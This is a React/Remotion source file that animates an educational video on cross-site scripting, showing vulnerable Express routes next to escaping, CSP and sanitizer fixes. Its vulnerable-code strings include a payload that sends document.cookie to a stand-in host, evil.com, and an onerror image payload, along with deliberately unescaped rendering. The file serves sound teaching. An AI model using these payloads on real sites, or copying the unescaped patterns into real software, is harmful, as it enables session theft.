import React from "react";
import { AbsoluteFill } from "remotion";
import { CodeEditor } from "../../components/CodeEditor";
import { Title } from "../../components/Title";
import { TransitionSeries, springTiming } from "@remotion/transitions";
import { ColorExplosion } from "../../components/ColorExplosion";

// Vulnerable Code Example
const vulnerableCode = `// ❌ Vulnerable Code Example
// User input directly rendered in HTML

app.get('/search', (req, res) => {
  const userQuery = req.query.q;
  
  // DANGEROUS: Direct HTML injection
  res.send(\`
    <h1>Search Results for: \${userQuery}</h1>
    <div id="results">...</div>
  \`);
});

// Malicious Input Example:
// ?q=<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>

// This will:
// 1. Execute arbitrary JavaScript
// 2. Steal user cookies
// 3. Send them to attacker's server`;

// Stored XSS Example
const storedXSSCode = `// ❌ Stored XSS Vulnerability
// Comments stored in database and displayed to users

// Save comment (vulnerable)
app.post('/comments', async (req, res) => {
  const comment = req.body.text;
  
  // DANGEROUS: Storing unescaped content
  await db.comments.create({
    text: comment,
    userId: req.user.id
  });
});

// Display comments (vulnerable)
app.get('/comments', async (req, res) => {
  const comments = await db.comments.findAll();
  
  // DANGEROUS: Raw HTML injection
  const html = comments
    .map(c => \`<div class="comment">\${c.text}</div>\`)
    .join('');
    
  res.send(html);
});

// Malicious Comment:
// <img src="x" onerror="alert(document.cookie)">`;

// Prevention Methods
const preventionCode = `// ✅ XSS Prevention Methods

// 1. Content Escaping
import { escape } from 'html-escaper';

app.get('/search', (req, res) => {
  const userQuery = escape(req.query.q);
  res.send(\`
    <h1>Search Results for: \${userQuery}</h1>
  \`);
});

// 2. Content Security Policy (CSP)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self';" +
    "script-src 'self' 'nonce-random123';" +
    "style-src 'self' 'unsafe-inline';"
  );
  next();
});

// 3. HttpOnly Cookies
app.use(session({
  cookie: {
    httpOnly: true, // Prevents JS access
    secure: true    // Only sent over HTTPS
  }
}));`;

// Framework Solutions
const frameworkCode = `// ✅ Modern Framework Solutions

// React (Automatic Escaping)
function SearchResults({ query }) {
  return (
    <div>
      <h1>Results for: {query}</h1>
      {/* React automatically escapes this */}
    </div>
  );
}

// Vue.js (v-html with sanitization)
import DOMPurify from 'dompurify';

export default {
  template: \`
    <div v-html="sanitizedContent"></div>
  \`,
  computed: {
    sanitizedContent() {
      return DOMPurify.sanitize(this.content);
    }
  }
};

// Express + Sanitizer Middleware
app.use(expressSanitizer());
app.post('/comments', (req, res) => {
  const safe = req.sanitize(req.body.comment);
  // Now safe to store and render
});`;

export const XSSVideo: React.FC = () => {
  return (
    <AbsoluteFill style={{ position: "relative" }}>
      <TransitionSeries>
        {/* Main Title */}
        <TransitionSeries.Sequence durationInFrames={150}>
          <AbsoluteFill>
            <ColorExplosion />
            <Title
              title="Cross-Site Scripting (XSS)"
              subtitle="Protect Your Web Apps from Injection Attacks 🛡️"
            />
          </AbsoluteFill>
        </TransitionSeries.Sequence>

        <TransitionSeries.Transition
          timing={springTiming({ durationInFrames: 30 })}
        />

        {/* Vulnerable Code Title */}
        <TransitionSeries.Sequence durationInFrames={90}>
          <AbsoluteFill>
            <ColorExplosion />
            <Title
              title="Vulnerable Code"
              subtitle="Common XSS Vulnerabilities ⚠️"
            />
          </AbsoluteFill>
        </TransitionSeries.Sequence>

        <TransitionSeries.Transition
          timing={springTiming({ durationInFrames: 30 })}
        />

        {/* Vulnerable Example */}
        <TransitionSeries.Sequence durationInFrames={450}>
          <CodeEditor
            initialCode={vulnerableCode}
            typingSpeed={1.6}
            showLineNumbers={true}
            theme="dark"
          />
        </TransitionSeries.Sequence>

        <TransitionSeries.Transition
          timing={springTiming({ durationInFrames: 30 })}
        />

        {/* Stored XSS Title */}
        <TransitionSeries.Sequence durationInFrames={90}>
          <AbsoluteFill>
            <ColorExplosion />
            <Title
              title="Stored XSS"
              subtitle="Persistent Attacks in Databases 💾"
            />
          </AbsoluteFill>
        </TransitionSeries.Sequence>

        <TransitionSeries.Transition
          timing={springTiming({ durationInFrames: 30 })}
        />

        {/* Stored XSS Example */}
        <TransitionSeries.Sequence durationInFrames={500}>
          <CodeEditor
            initialCode={storedXSSCode}
            typingSpeed={1.6}
            showLineNumbers={true}
            theme="dark"
          />
        </TransitionSeries.Sequence>

        <TransitionSeries.Transition
          timing={springTiming({ durationInFrames: 30 })}
        />

        {/* Prevention Title */}
        <TransitionSeries.Sequence durationInFrames={90}>
          <AbsoluteFill>
            <ColorExplosion />
            <Title
              title="Prevention Methods"
              subtitle="Best Practices for Security 🛡️"
            />
          </AbsoluteFill>
        </TransitionSeries.Sequence>

        <TransitionSeries.Transition
          timing={springTiming({ durationInFrames: 30 })}
        />

        {/* Prevention Example */}
        <TransitionSeries.Sequence durationInFrames={450}>
          <CodeEditor
            initialCode={preventionCode}
            typingSpeed={1.6}
            showLineNumbers={true}
            theme="dark"
          />
        </TransitionSeries.Sequence>

        <TransitionSeries.Transition
          timing={springTiming({ durationInFrames: 30 })}
        />

        {/* Framework Solutions Title */}
        <TransitionSeries.Sequence durationInFrames={90}>
          <AbsoluteFill>
            <ColorExplosion />
            <Title
              title="Framework Solutions"
              subtitle="Modern Security Features ✨"
            />
          </AbsoluteFill>
        </TransitionSeries.Sequence>

        <TransitionSeries.Transition
          timing={springTiming({ durationInFrames: 30 })}
        />

        {/* Framework Solutions Example */}
        <TransitionSeries.Sequence durationInFrames={450}>
          <CodeEditor
            initialCode={frameworkCode}
            typingSpeed={1.6}
            showLineNumbers={true}
            theme="dark"
          />
        </TransitionSeries.Sequence>

        {/* Final Message */}
        <TransitionSeries.Sequence durationInFrames={120}>
          <AbsoluteFill>
            <ColorExplosion />
            <Title
              title="Secure Your Apps!"
              subtitle="Prevention is Better Than Cure 🔒"
            />
          </AbsoluteFill>
        </TransitionSeries.Sequence>
      </TransitionSeries>
    </AbsoluteFill>
  );
};
